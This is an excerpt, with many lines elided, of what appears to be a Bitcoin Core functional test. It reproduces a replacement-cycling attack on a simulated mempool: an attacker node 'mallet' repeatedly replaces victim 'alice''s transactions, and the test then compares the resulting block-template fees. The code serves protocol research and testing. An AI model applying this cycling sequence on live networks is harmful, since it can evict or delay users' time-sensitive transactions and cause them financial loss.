...
"""Test replacement cyling attacks - Feerate Differential Variant - Cluster Mempool"""
...
class ReplacementCyclingFeerateDifferentialClusterTest(BitcoinTestFramework):
    ...
    def test_replacement_cycling_feerate_differential_cluster(self):
        ...
        single_tx_txid = alice.sendrawtransaction(single_tx.serialize().hex())
        ...
        self.log.info("Starting Replacement Cycling Attack - Feerate Differential Cluster")
        ...
        alice.submitpackage([alice_parent.serialize().hex(), alice_first_child.serialize().hex()])
        ...
        assert alice_parent_txid in mallet.getrawmempool()
        assert alice_first_child_txid in mallet.getrawmempool()
        assert alice_parent_txid in alice.getrawmempool()
        assert alice_first_child_txid in alice.getrawmempool()

        assert_equal(2, len(alice.getrawmempool()))
        assert_equal(2, len(mallet.getrawmempool()))
        assert_equal(2, len(mary.getrawmempool()))

        #self.log.info("BROADCAST #1 Alice mempool {}".format(alice.getrawmempool()))

        alice_parent_entry = alice.getmempoolentry(alice_parent_txid)
        ...
        submitpackage_ret = mallet.submitpackage([mallet_first_rbf.serialize().hex()])
        ...
        assert mallet_first_rbf_txid in mallet.getrawmempool()
        assert alice_first_child_txid not in mallet.getrawmempool()
        assert mallet_first_rbf_txid in alice.getrawmempool()
        assert alice_first_child_txid not in alice.getrawmempool()
        ...
        submitpackage_ret = mallet.submitpackage([mallet_second_rbf.serialize().hex()])
        ...
        assert mallet_first_rbf_txid not in mallet.getrawmempool()
        assert mallet_second_rbf_txid in mallet.getrawmempool()
        assert mallet_first_rbf_txid not in alice.getrawmempool()
        assert mallet_second_rbf_txid in alice.getrawmempool()
        ...
        submitpackage_ret = alice.submitpackage([alice_first_rbf.serialize().hex()])
        assert_equal(submitpackage_ret['package_msg'], 'success')
        ...
        assert mallet_first_rbf_txid not in mallet.getrawmempool()
        assert mallet_second_rbf_txid in mallet.getrawmempool()
        assert alice_first_rbf_txid in mallet.getrawmempool()
        assert mallet_first_rbf_txid not in alice.getrawmempool()
        assert mallet_second_rbf_txid in alice.getrawmempool()
        assert alice_first_rbf_txid in alice.getrawmempool()

        #self.log.info("BROADCAST #4 Alice mempool {}".format(alice.getrawmempool()))

        alice_first_rbf_entry = alice.getmempoolentry(alice_first_rbf_txid)
        ...
        submitpackage_ret = mallet.submitpackage([mallet_third_rbf.serialize().hex()])
        assert_equal(submitpackage_ret['package_msg'], 'success')
        ...
        assert mallet_third_rbf_txid in alice.getrawmempool()
        assert mallet_third_rbf_txid in mallet.getrawmempool()
        ...
        mallet_package_child_rbf = generate_v3_single_tx_no_wallet(mallet_package_parent_rbf_txid, 0, mallet_package_parent_rbf.vout[0].nValue, 28, 0)
        mallet_package_child_rbf_txid = mallet_package_child_rbf.rehash()

        # No package relay yet.
        mallet_submitpackage_ret = mallet.submitpackage([mallet_package_parent_rbf.serialize().hex(), mallet_package_child_rbf.serialize().hex()])
        assert_equal(mallet_submitpackage_ret['package_msg'], 'success')
        alice_submitpackage_ret = alice.submitpackage([mallet_package_parent_rbf.serialize().hex(), mallet_package_child_rbf.serialize().hex()])
        assert_equal(alice_submitpackage_ret['package_msg'], 'success')
        ...
        assert alice_parent_txid in mallet.getrawmempool()
        assert mallet_package_parent_rbf_txid in mallet.getrawmempool()
        assert mallet_package_child_rbf_txid in mallet.getrawmempool()
        assert alice_parent_txid in alice.getrawmempool()
        assert mallet_package_parent_rbf_txid in alice.getrawmempool()
        assert mallet_package_child_rbf_txid in alice.getrawmempool()

        mallet_package_parent_rbf_entry = mallet.getmempoolentry(mallet_package_parent_rbf_txid)
        mallet_package_child_rbf_entry = mallet.getmempoolentry(mallet_package_child_rbf_txid)

        #self.log.info("BROADCAST #7 Alice mempool {}".format(alice.getrawmempool()))

        #self.log.info("Mallet Submitpackage Package RBF Ret {}".format(submitpackage_ret))

        # SHOULD HIT : "package RBF checks passed" in the logs
        #assert_equal(True, False)
 
        self.log.info("Block Templates Comparison")

        #self.log.info("Alice Parent Tx {}".format(alice_parent_entry))
        #self.log.info("Alice Rbf Tx {}".format(alice_first_rbf_entry))
        #self.log.info("Mallet Package Parent Tx {}".format(mallet_package_parent_rbf_entry))
        #self.log.info("Mallet Package Child Tx {}".format(mallet_package_child_rbf_entry))

        mary_block_template_vsize = alice_parent_entry['vsize'] + mallet_package_parent_rbf_entry['vsize'] + mallet_package_child_rbf_entry['vsize']
        mallet_block_template_vsize = alice_parent_entry['vsize'] + alice_first_rbf_entry['vsize'] + mallet_package_parent_rbf_entry['vsize'] + mallet_package_child_rbf_entry['vsize']

        mary_block_template_fees = alice_parent_entry['fees']['base'] + mallet_package_parent_rbf_entry['fees']['base'] + mallet_package_child_rbf_entry['fees']['base']
        mallet_block_template_fees = alice_parent_entry['fees']['base'] + alice_first_rbf_entry['fees']['base'] + mallet_package_parent_rbf_entry['fees']['base'] + mallet_package_child_rbf_entry['fees']['base']
    ...
    def run_test(self):
        ...
        self.test_replacement_cycling_feerate_differential_cluster()

if __name__ == '__main__':
    ReplacementCyclingFeerateDifferentialClusterTest(__file__).main()
